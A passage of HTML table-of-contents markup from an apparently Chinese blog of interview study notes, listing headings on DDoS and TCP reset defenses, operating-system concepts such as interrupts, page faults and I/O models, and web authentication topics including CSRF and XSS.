href="#%E5%9B%9B%E7%A7%8D%E5%B8%B8%E8%A7%81-DDoS%EF%BC%88%E5%88%86%E5%B8%83%E5%BC%8F%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%EF%BC%89-%E6%94%BB%E5%87%BB%E7%B1%BB%E5%9E%8B-%E5%8F%8A%E5%85%B6-%E9%98%B2%E6%8A%A4%E7%AD%96%E7%95%A5%E6%80%BB%E7%BB%93"><span class="toc-text">四种常见 DDoS（分布式拒绝服务） 攻击类型 及其 防护策略总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9B%E7%A7%8D%E5%B8%B8%E8%A7%81-DDoS-%E6%94%BB%E5%87%BB%E7%B1%BB%E5%9E%8B-%E5%8F%8A%E5%85%B6-%E9%98%B2%E6%8A%A4%E7%AD%96%E7%95%A5-%E7%9A%84%E6%A0%87%E5%87%86%E5%9B%9E%E7%AD%94%E6%A8%A1%E6%9D%BF"><span class="toc-text">四种常见 DDoS 攻击类型 及其 防护策略 的标准回答模板</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E9%9D%A2%E8%AF%95%E9%AB%98%E9%A2%91%E9%97%AE%EF%BC%9A%E8%AF%B7%E7%AE%80%E8%A6%81%E8%AF%B4%E6%98%8E-SYN-Flood%E3%80%81UDP-Flood%E3%80%81HTTP-Flood%E3%80%81DNS-Flood-%E7%9A%84%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86%E4%B8%8E%E9%98%B2%E6%8A%A4%E6%8E%AA%E6%96%BD%E3%80%82"><span class="toc-text">✅ 面试高频问：请简要说明 SYN Flood、UDP Flood、HTTP Flood、DNS Flood 的攻击原理与防护措施。</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81SYN-Flood-%E6%94%BB%E5%87%BB"><span class="toc-text">一、SYN Flood 攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81UDP-Flood-%E6%94%BB%E5%87%BB"><span class="toc-text">二、UDP Flood 攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E3%80%81HTTP-Flood-%E6%94%BB%E5%87%BB"><span class="toc-text">三、HTTP Flood 攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9B%E3%80%81DNS-Flood-%E6%94%BB%E5%87%BB"><span class="toc-text">四、DNS Flood 攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E5%8A%A0%E5%88%86%E5%BB%BA%E8%AE%AE%EF%BC%88%E5%A6%82%E9%9D%A2%E8%AF%95%E5%85%81%E8%AE%B8%E4%BD%A0%E5%A4%9A%E8%AF%B4%E4%B8%A4%E5%8F%A5%EF%BC%89%EF%BC%9A"><span class="toc-text">✅ 加分建议（如面试允许你多说两句）：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%BA%94%E5%AF%B9-DDoS-%E6%94%BB%E5%87%BB%EF%BC%9F"><span class="toc-text">如何应对 DDoS 攻击？</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81%E9%AB%98%E9%98%B2%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="toc-text">1、高防服务器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81%E9%BB%91%E5%90%8D%E5%8D%95"><span class="toc-text">2、黑名单</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3%E3%80%81DDoS-%E6%B8%85%E6%B4%97"><span class="toc-text">3、DDoS 清洗</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4%E3%80%81CDN-%E5%8A%A0%E9%80%9F"><span class="toc-text">4、CDN 加速</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%A7%BE-%E4%BA%8C%E3%80%81%E9%9D%A2%E8%AF%95%E5%9B%9E%E7%AD%94%E6%A8%A1%E6%9D%BF%EF%BC%88%E4%BB%A5-DNS-Flood-%E5%92%8C-DNS-%E6%94%BE%E5%A4%A7%E4%B8%BA%E4%BE%8B%EF%BC%89%EF%BC%9A"><span class="toc-text">🧾 二、面试回答模板（以 DNS Flood 和 DNS 放大为例）：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%F0%9F%93%8C-%E9%9D%A2%E8%AF%95%E5%AE%98%EF%BC%9A%E4%BD%A0%E6%80%8E%E4%B9%88%E9%98%B2%E6%8A%A4-DNS-Flood-%E5%92%8C-DNS-%E6%94%BE%E5%A4%A7%E6%94%BB%E5%87%BB%EF%BC%9F"><span class="toc-text">📌 面试官：你怎么防护 DNS Flood 和 DNS 放大攻击？</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%A7%A0-%E4%B8%89%E3%80%81%E5%8F%A3%E8%AF%80%E8%BE%85%E5%8A%A9%E8%AE%B0%E5%BF%86%E6%B3%95%EF%BC%9A"><span class="toc-text">🧠 三、口诀辅助记忆法：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#DNS-Flood%EF%BC%88%E6%94%BB%E5%87%BB%E6%88%91%EF%BC%89%EF%BC%9A"><span class="toc-text">DNS Flood（攻击我）：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DNS-%E6%94%BE%E5%A4%A7%EF%BC%88%E6%88%91%E8%A2%AB%E6%BB%A5%E7%94%A8%EF%BC%89%EF%BC%9A"><span class="toc-text">DNS 放大（我被滥用）：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DRDoS"><span class="toc-text">DRDoS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TCP%E9%87%8D%E7%BD%AE%E6%94%BB%E5%87%BB"><span class="toc-text">TCP重置攻击</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E4%B8%80%E3%80%81TCP-%E9%87%8D%E7%BD%AE%E6%94%BB%E5%87%BB%EF%BC%88TCP-Reset-Attack%EF%BC%89"><span class="toc-text">✅ 一、TCP 重置攻击（TCP Reset Attack）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%8E%AF-%E7%8E%B0%E5%AE%9E%E4%BE%8B%E5%AD%90%E7%B1%BB%E6%AF%94%EF%BC%9A"><span class="toc-text">🎯 现实例子类比：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%A7%A0-%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%EF%BC%9A"><span class="toc-text">🧠 技术原理：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%9B%A1-%E9%98%B2%E6%8A%A4%E7%AD%96%E7%95%A5%EF%BC%9A"><span class="toc-text">🛡 防护策略：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WebSocket%E5%92%8CSocket%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-text">WebSocket和Socket的区别</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E9%9D%A2%E8%AF%95%E6%80%BB%E7%BB%93%E8%AF%9D%E6%9C%AF"><span class="toc-text">✅ 面试总结话术</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Nagle%E7%AE%97%E6%B3%95%E5%92%8C%E5%BB%B6%E8%BF%9F%E7%A1%AE%E8%AE%A4"><span class="toc-text">Nagle算法和延迟确认</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">javaguide-操作系统</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E6%80%81%E5%92%8C%E5%86%85%E6%A0%B8%E6%80%81%E6%98%AF%E6%80%8E%E4%B9%88%E5%88%87%E6%8D%A2%E7%9A%84"><span class="toc-text">用户态和内核态是怎么切换的</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E4%B8%89%E3%80%81%E4%B8%AD%E6%96%AD%E4%B8%8E%E5%BC%82%E5%B8%B8%E7%9A%84%E5%88%86%E7%B1%BB%EF%BC%88%E8%AF%A6%E7%BB%86%E8%AF%B4%E6%98%8E%EF%BC%89"><span class="toc-text">✅ 三、中断与异常的分类（详细说明）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%93%8C-%E4%B8%AD%E6%96%AD%E5%88%86%E7%B1%BB%EF%BC%9A"><span class="toc-text">📌 中断分类：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%93%8C-%E5%BC%82%E5%B8%B8%E5%88%86%E7%B1%BB%EF%BC%9A"><span class="toc-text">📌 异常分类：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E5%9B%9B%E3%80%81%E5%A4%84%E7%90%86%E8%BF%87%E7%A8%8B%E4%B8%8A%E7%9A%84%E4%B8%8D%E5%90%8C%EF%BC%9A"><span class="toc-text">✅ 四、处理过程上的不同：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%AD%E6%96%AD%E5%A4%84%E7%90%86%E8%BF%87%E7%A8%8B%EF%BC%9A"><span class="toc-text">中断处理过程：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E8%BF%87%E7%A8%8B%EF%BC%9A"><span class="toc-text">异常处理过程：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E4%B8%80%E3%80%81%E4%B8%AD%E6%96%AD%E7%9A%84%E7%BB%8F%E5%85%B8%E4%BE%8B%E5%AD%90"><span class="toc-text">✅ 一、中断的经典例子</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%8C%90-%E7%A4%BA%E4%BE%8B%EF%BC%9A%E9%94%AE%E7%9B%98%E8%BE%93%E5%85%A5%E4%B8%AD%E6%96%AD"><span class="toc-text">🌐 示例：键盘输入中断</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E4%BA%8C%E3%80%81%E5%BC%82%E5%B8%B8%E7%9A%84%E7%BB%8F%E5%85%B8%E4%BE%8B%E5%AD%90"><span class="toc-text">✅ 二、异常的经典例子</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%92%A5-%E7%A4%BA%E4%BE%8B1%EF%BC%9A%E9%99%A4%E4%BB%A5%E9%9B%B6%E9%94%99%E8%AF%AF"><span class="toc-text">💥 示例1：除以零错误</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%92%A1-%E7%A4%BA%E4%BE%8B2%EF%BC%9A%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E5%BC%82%E5%B8%B8%EF%BC%88%E8%BD%AF%E4%B8%AD%E6%96%AD-Trap%EF%BC%89"><span class="toc-text">💡 示例2：系统调用异常（软中断 Trap）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Socket"><span class="toc-text">Socket</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%83%B5%E5%B0%B8%E8%BF%9B%E7%A8%8B%E5%92%8C%E5%AD%A4%E5%84%BF%E8%BF%9B%E7%A8%8B"><span class="toc-text">僵尸进程和孤儿进程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%93%B6%E8%A1%8C%E5%AE%B6%E7%AE%97%E6%B3%95"><span class="toc-text">银行家算法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%A0-%E4%B8%80%E3%80%81%E8%AE%BE%E8%AE%A1%E6%80%9D%E6%83%B3"><span class="toc-text">🧠 一、设计思想</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%9B%A0-%E5%9B%9B%E3%80%81%E4%BE%8B%E5%AD%90%EF%BC%88%E6%89%8B%E5%8A%A8%E6%A8%A1%E6%8B%9F%EF%BC%89"><span class="toc-text">🛠 四、例子（手动模拟）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A1%AC%E6%80%A7%E9%A1%B5%E7%BC%BA%E5%A4%B1%E5%92%8C%E8%BD%AF%E6%80%A7%E9%A1%B5%E7%BC%BA%E5%A4%B1"><span class="toc-text">硬性页缺失和软性页缺失</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%A0-%E5%9C%BA%E6%99%AF%E8%AE%BE%E5%AE%9A%EF%BC%9A%E6%9F%90%E8%BF%9B%E7%A8%8B%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%89%93%E5%BC%80%E4%B8%80%E4%B8%AA%E5%A4%A7%E6%96%87%E4%BB%B6%E5%B9%B6%E8%AF%BB%E5%8F%96%E5%86%85%E5%AE%B9"><span class="toc-text">🧠 场景设定：某进程第一次打开一个大文件并读取内容</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81%E7%A1%AC%E6%80%A7%E9%A1%B5%E7%BC%BA%E5%A4%B1%EF%BC%88Hard-Page-Fault%EF%BC%89%E5%87%BA%E7%8E%B0%E8%BF%87%E7%A8%8B"><span class="toc-text">1、硬性页缺失（Hard Page Fault）出现过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%91%E7%94%9F%E6%AD%A5%E9%AA%A4%EF%BC%9A"><span class="toc-text">发生步骤：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81%E8%BD%AF%E6%80%A7%E9%A1%B5%E7%BC%BA%E5%A4%B1%EF%BC%88Soft-Page-Fault%EF%BC%89%E5%87%BA%E7%8E%B0%E8%BF%87%E7%A8%8B"><span class="toc-text">2、软性页缺失（Soft Page Fault）出现过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%81%87%E8%AE%BE%EF%BC%9A"><span class="toc-text">假设：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%91%E7%94%9F%E6%AD%A5%E9%AA%A4%EF%BC%9A-2"><span class="toc-text">发生步骤：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A1%AC%E9%93%BE%E6%8E%A5%E5%92%8C%E8%BD%AF%E9%93%BE%E6%8E%A5"><span class="toc-text">硬链接和软链接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E7%A1%AC%E9%93%BE%E6%8E%A5%EF%BC%88Hard-Link%EF%BC%89"><span class="toc-text">一、硬链接（Hard Link）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%94%8D-%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5"><span class="toc-text">🔍 基本概念</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%A7%A0-%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86"><span class="toc-text">🧠 工作原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%93%8C-%E7%89%B9%E7%82%B9"><span class="toc-text">📌 特点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E5%88%9B%E5%BB%BA%E5%91%BD%E4%BB%A4"><span class="toc-text">✅ 创建命令</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E8%BD%AF%E9%93%BE%E6%8E%A5%EF%BC%88Symbolic-Link-Symlink%EF%BC%89"><span class="toc-text">二、软链接（Symbolic Link &#x2F; Symlink）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%94%8D-%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5-2"><span class="toc-text">🔍 基本概念</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%A7%A0-%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86-2"><span class="toc-text">🧠 工作原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%93%8C-%E7%89%B9%E7%82%B9-2"><span class="toc-text">📌 特点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E5%88%9B%E5%BB%BA%E5%91%BD%E4%BB%A4-2"><span class="toc-text">✅ 创建命令</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B4%BB%E9%94%81%E5%92%8C%E9%A5%A5%E9%A5%BF%E9%94%81"><span class="toc-text">活锁和饥饿锁</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E4%B8%80%E3%80%81%E9%A5%A5%E9%A5%BF%EF%BC%88Starvation%EF%BC%89"><span class="toc-text">✅ 一、饥饿（Starvation）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%94%B9-%E5%AE%9A%E4%B9%89%EF%BC%9A"><span class="toc-text">🔹 定义：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%94%B9-%E5%8E%9F%E5%9B%A0%EF%BC%9A"><span class="toc-text">🔹 原因：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%94%B9-%E7%A4%BA%E4%BE%8B%EF%BC%88Java-%E9%9D%9E%E5%85%AC%E5%B9%B3%E9%94%81%EF%BC%89%EF%BC%9A"><span class="toc-text">🔹 示例（Java 非公平锁）：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E4%BA%8C%E3%80%81%E6%B4%BB%E9%94%81%EF%BC%88Livelock%EF%BC%89"><span class="toc-text">✅ 二、活锁（Livelock）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%94%B9-%E5%AE%9A%E4%B9%89%EF%BC%9A-2"><span class="toc-text">🔹 定义：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%94%B9-%E7%89%B9%E7%82%B9%EF%BC%9A"><span class="toc-text">🔹 特点：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%94%B9-%E7%A4%BA%E4%BE%8B%EF%BC%88%E8%AE%A9%E6%9D%A5%E8%AE%A9%E5%8E%BB%EF%BC%89%EF%BC%9A"><span class="toc-text">🔹 示例（让来让去）：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E4%B8%89%E3%80%81%E9%9D%A2%E8%AF%95%E6%80%BB%E7%BB%93%E8%AF%9D%E6%9C%AF-%E2%9C%85"><span class="toc-text">✅ 三、面试总结话术 ✅</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E7%A7%8D-I-O-%E7%BC%96%E7%A8%8B%E6%A8%A1%E5%9E%8BBIO%E3%80%81NIO%E3%80%81AIO%E5%8F%8AI-O-%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8%E5%AE%9E%E7%8E%B0%E6%96%B9%E5%BC%8Fselect%E3%80%81poll%E3%80%81epoll"><span class="toc-text">三种 I&#x2F;O 编程模型BIO、NIO、AIO及I&#x2F;O 多路复用实现方式select、poll、epoll</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E4%B8%BA%E4%BB%80%E4%B9%88%E6%9C%89%E4%BA%BA%E4%BC%9A%E8%AF%B4%E6%98%AF%E2%80%9C%E4%BA%94%E7%A7%8D%E6%A8%A1%E5%9E%8B%EF%BC%9F"><span class="toc-text">✅ 为什么有人会说是“五种模型？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E6%80%BB%E7%BB%93%E4%B8%80%E5%8F%A5%E8%AF%9D%E8%AE%B0%E5%BF%86%EF%BC%9A"><span class="toc-text">✅ 总结一句话记忆：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E4%BA%8C%E3%80%81%E6%A8%A1%E5%9E%8B%E5%8E%9F%E7%90%86-%E4%B8%BE%E4%BE%8B%E8%AE%B2%E8%A7%A3"><span class="toc-text">✅ 二、模型原理 &amp; 举例讲解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%85%B0%EF%B8%8F-1-BIO%EF%BC%88Blocking-IO%EF%BC%89%E2%80%94%E2%80%94%E2%80%9C%E4%B8%80%E8%BF%9E%E6%8E%A5%E4%B8%80%E7%BA%BF%E7%A8%8B%E2%80%9D"><span class="toc-text">🅰️ 1. BIO（Blocking IO）——“一连接一线程”</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%9D%97-%E7%89%B9%E7%82%B9%EF%BC%9A"><span class="toc-text">❗ 特点：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%9C%85-%E7%A4%BA%E4%BE%8B%EF%BC%88Java%EF%BC%89%EF%BC%9A"><span class="toc-text">✅ 示例（Java）：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%85%B1%EF%B8%8F-2-NIO%EF%BC%88Non-blocking-IO%EF%BC%89%E2%80%94%E2%80%94%E2%80%9C%E4%B8%80%E4%B8%AA%E7%BA%BF%E7%A8%8B%E7%AE%A1%E7%90%86%E5%A4%9A%E4%B8%AA%E8%BF%9E%E6%8E%A5%E2%80%9D"><span class="toc-text">🅱️ 2. NIO（Non-blocking IO）——“一个线程管理多个连接”</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%9D%97-%E7%89%B9%E7%82%B9%EF%BC%9A-2"><span class="toc-text">❗ 特点：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%9C%85-%E7%A4%BA%E4%BE%8B%E9%80%BB%E8%BE%91%EF%BC%9A"><span class="toc-text">✅ 示例逻辑：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%85%BE%EF%B8%8F-3-AIO%EF%BC%88Asynchronous-IO%EF%BC%89%E2%80%94%E2%80%94%E2%80%9C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%B4%9F%E8%B4%A3%E9%80%9A%E7%9F%A5%E4%BD%A0%E2%80%9D"><span class="toc-text">🅾️ 3. AIO（Asynchronous IO）——“操作系统负责通知你”</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%9D%97-%E7%89%B9%E7%82%B9%EF%BC%9A-3"><span class="toc-text">❗ 特点：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%9C%85-%E7%A4%BA%E4%BE%8B%E9%80%BB%E8%BE%91%EF%BC%88Java-AIO%EF%BC%89%EF%BC%9A"><span class="toc-text">✅ 示例逻辑（Java AIO）：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%A7%AC-4-%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8%E6%A8%A1%E5%9E%8B%EF%BC%88select%E3%80%81poll%E3%80%81epoll%EF%BC%89"><span class="toc-text">🧬 4. 多路复用模型（select、poll、epoll）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%9C%85-select%EF%BC%88%E7%BB%8F%E5%85%B8%EF%BC%8C%E5%A4%9A%E5%B9%B3%E5%8F%B0%E6%94%AF%E6%8C%81%EF%BC%89"><span class="toc-text">✅ select（经典，多平台支持）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%9C%85-poll%EF%BC%88select-%E7%9A%84%E6%94%B9%E8%BF%9B%EF%BC%89"><span class="toc-text">✅ poll（select 的改进）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%9C%85-epoll%EF%BC%88Linux-%E7%8B%AC%E6%9C%89%EF%BC%8C%E6%9C%80%E4%BC%98%EF%BC%89"><span class="toc-text">✅ epoll（Linux 独有，最优）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%9C%85-Java-NIO-%E5%BA%95%E5%B1%82%E5%B0%B1%E6%98%AF%E7%94%A8-epoll%EF%BC%88Linux%EF%BC%89%E6%88%96-select%EF%BC%88Windows%EF%BC%89"><span class="toc-text">✅ Java NIO 底层就是用 epoll（Linux）或 select（Windows）</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E4%BA%94%E3%80%81%E9%9D%A2%E8%AF%95%E7%AD%94%E9%A2%98%E6%A8%A1%E6%9D%BF"><span class="toc-text">✅ 五、面试答题模板</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">javaguide-系统设计</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83"><span class="toc-text">认证授权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#RBAC%E6%A8%A1%E5%9E%8B"><span class="toc-text">RBAC模型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88-Cookie-%E6%97%A0%E6%B3%95%E9%98%B2%E6%AD%A2-CSRF-%E6%94%BB%E5%87%BB%EF%BC%8C%E8%80%8C-Token-%E5%8F%AF%E4%BB%A5%EF%BC%9FXSS%E5%8F%88%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-text">为什么 Cookie 无法防止 CSRF 攻击，而 Token 可以？XSS又是什么？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E4%B8%BA%E4%BB%80%E4%B9%88-Cookie-%E4%BC%9A%E5%AF%BC%E8%87%B4-CSRF%EF%BC%9F"><span class="toc-text">✅ 为什么 Cookie 会导致 CSRF？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-Token-%E4%B8%BA%E4%BB%80%E4%B9%88%E5%B0%B1%E4%B8%8D%E4%BC%9A%E8%A2%AB%E6%94%BB%E5%87%BB%E8%80%85%E5%88%A9%E7%94%A8%EF%BC%9F"><span class="toc-text">✅ Token 为什么就不会被攻击者利用？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%8C%9F-%E7%99%BB%E5%BD%95%E5%90%8E%EF%BC%9A"><span class="toc-text">🌟 登录后：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%8C%9F-%E5%89%8D%E7%AB%AF%E4%BF%9D%E5%AD%98%E6%96%B9%E5%BC%8F%EF%BC%9A"><span class="toc-text">🌟 前端保存方式：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%8C%9F-%E5%8F%91%E9%80%81%E8%AF%B7%E6%B1%82%E6%97%B6%EF%BC%9A"><span class="toc-text">🌟 发送请求时：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E6%94%BB%E5%87%BB%E8%80%85%E6%97%A0%E6%B3%95%E5%81%9A%E7%9A%84%E4%BA%8B%EF%BC%9A"><span class="toc-text">✅ 攻击者无法做的事：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9D%8C-%E6%97%A0%E6%B3%95%E8%AE%BF%E9%97%AE%E4%BD%A0%E7%9A%84-localStorage"><span class="toc-text">❌ 无法访问你的 localStorage</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9D%8C-%E6%97%A0%E6%B3%95%E6%B7%BB%E5%8A%A0%E8%87%AA%E5%AE%9A%E4%B9%89%E7%9A%84%E8%AF%B7%E6%B1%82%E5%A4%B4"><span class="toc-text">❌ 无法添加自定义的请求头</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E4%B8%BE%E4%B8%AA%E4%BE%8B%E5%AD%90%E5%AF%B9%E6%AF%94"><span class="toc-text">✅ 举个例子对比</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%8E%AF-%E4%BC%A0%E7%BB%9F-Cookie-%E7%99%BB%E5%BD%95%EF%BC%88%E5%AE%B9%E6%98%93%E8%A2%AB-CSRF%EF%BC%89"><span class="toc-text">🎯 传统 Cookie 登录（容易被 CSRF）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%8E%AF-JWT-Token-%E7%99%BB%E5%BD%95%EF%BC%88%E5%AE%89%E5%85%A8%EF%BC%89"><span class="toc-text">🎯 JWT Token 登录（安全）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81XSS-%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-text">一、XSS 是什么？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81XSS-%E6%94%BB%E5%87%BB%E7%9A%84%E6%9C%AC%E8%B4%A8"><span class="toc-text">二、XSS 攻击的本质</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81Token-%E4%B8%BA%E4%BB%80%E4%B9%88%E9%98%B2%E4%B8%8D%E4%BA%86-XSS%EF%BC%9F"><span class="toc-text">三、Token 为什么防不了 XSS？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" 